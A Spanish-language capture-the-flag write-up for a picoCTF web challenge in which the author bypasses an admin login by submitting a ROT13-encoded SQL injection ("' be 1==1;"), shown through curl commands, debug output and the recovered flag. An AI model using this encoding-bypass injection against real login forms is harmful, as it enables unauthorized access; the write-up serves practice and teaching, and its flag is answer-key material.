## Objetivo
There is a secure website running at `https://jupiter.challenges.picoctf.org/problem/29132/` ([link](https://jupiter.challenges.picoctf.org/problem/29132/)) or http://jupiter.challenges.picoctf.org:29132. Try to see if you can login as admin!

## Solución

En este nivel ya no tenemos un campo de login, para realizar algún tipo de inyección SQL, pero si tenemos un campo de password, que al activar el campo debug, nos permite ver que todas las contraseñas ingresadas están de manera encriptada, en este caso al probar con varios métodos de encriptación se puede ver que es **ROT13** el tipo de encriptado, y que cada contraseña que ingresamos se transforma en **ROT13**, por lo que si ingresamos una inyección SQL, de tipo **' or 1 == 1** esta resulta convertida en **' be 1 == 1**, peeero, si nosotros la ingresamos como **' be 1 == 1**, el resultado sería **' or 1 == 1** y eso efectivamente si funciona.

```bash
mrfear@nightmare ~ % curl -s https://jupiter.challenges.picoctf.org/problem/29132/login.php -d "username=admin&password=hola;&debug=1"
<pre>password: hola;
SQL query: SELECT * FROM admin where password = 'ubyn;'
</pre><h1>Login failed.</h1>%                                                                            mrfear@nightmare ~ % echo "hola" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
ubyn
mrfear@nightmare ~ % curl -s https://jupiter.challenges.picoctf.org/problem/29132/login.php -d "username=admin&password=' or 1==1;&debug=1"
<pre>password: ' or 1==1;
SQL query: SELECT * FROM admin where password = '' be 1==1;'
</pre>%                                                                                                  mrfear@nightmare ~ % echo "' be 1==1;" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
' or 1==1;
mrfear@nightmare ~ % echo "' or 1==1" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
' be 1==1
mrfear@nightmare ~ % curl -s https://jupiter.challenges.picoctf.org/problem/29132/login.php -d "username=admin&password=' be 1==1;&debug=1"
<pre>password: ' be 1==1;
SQL query: SELECT * FROM admin where password = '' or 1==1;'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{3v3n_m0r3_SQL_06a9db19}</p>%                           mrfear@nightmare ~ %

```

## Bandera
picoCTF{3v3n_m0r3_SQL_06a9db19}

## Notas

## Referencias